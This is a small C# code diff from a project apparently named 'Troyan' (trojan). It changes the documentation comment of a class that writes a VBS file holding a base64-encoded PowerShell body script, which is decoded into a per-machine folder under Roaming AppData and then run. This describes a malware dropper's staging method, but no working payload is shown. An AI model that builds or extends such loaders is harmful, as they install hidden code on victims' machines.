@@ -2,7 +2,7 @@ using Commons;
 
 namespace Troyan.Core;
 
-/// <summary>Writes <c>troyan.vbs</c> with standard base64 of plain <c>body.debug.ps1</c> (decode under <c>%APPDATA%</c> to the same path as <c>Get-BodyPath</c>, then run).</summary>
+/// <summary>Writes <c>troyan.vbs</c> with standard base64 of plain <c>body.debug.ps1</c> (decode to the same path as <c>Get-BodyPath</c>: Roaming AppData, sanitized <c>MachineName</c> folder and script basename, then run).</summary>
 public sealed class TroyanPlainVbsEmitter : ITroyanPlainVbsEmitter
 {
     public void Write(ServerLayoutPaths layout)
